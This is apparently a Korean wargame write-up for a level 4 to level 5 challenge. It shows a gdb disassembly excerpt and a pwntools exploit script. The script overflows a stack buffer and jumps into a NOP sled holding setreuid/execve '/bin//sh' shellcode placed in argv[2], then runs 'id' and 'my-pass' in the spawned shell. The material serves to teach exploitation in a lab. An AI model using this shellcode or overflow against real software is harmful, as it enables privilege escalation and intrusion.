# Lv4 -> Lv5
## lv5
gdb를 이용해 lv5 바이너리를 분석해 보면 다음과 같다.


```asm
   0x080485d6 <+214>:	push   0x28
   0x080485d8 <+216>:	push   0x0
   0x080485da <+218>:	lea    eax,[ebp-0x28]
   0x080485dd <+221>:	push   eax
   0x080485de <+222>:	call   0x8048430 <memset@plt>		; memset(buf, 0, 0x28);
   0x080485e3 <+227>:	add    esp,0xc
```

이 문제는 앞 문제와 거의 같다. 차이점은 leave 직전에  buf를 모두 지운다는 것이다. 
하지만 앞 문제를 풀 때 argv[2]에 쉘코드를 넣었기 때문에 buf가 초기화 되어도 상관 없다.

## exploit.py

```python
from pwn import *

context.log_level = 'debug'

argv1 = "a"*0x2c  +  "\x90\xd3\xff\xff"
argv2 = "\x90"*2000 + "\x31\xc0\xb0\x31\xcd\x80\x89\xc3\x89\xc1\x31\xc0\xb0\x46\xcd\x80\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80"

p = process(['./lv5', argv1, argv2])
p.recvuntil('\n')
p.sendline('id')
p.recvuntil('\n')
p.sendline('my-pass')
p.interactive()
```
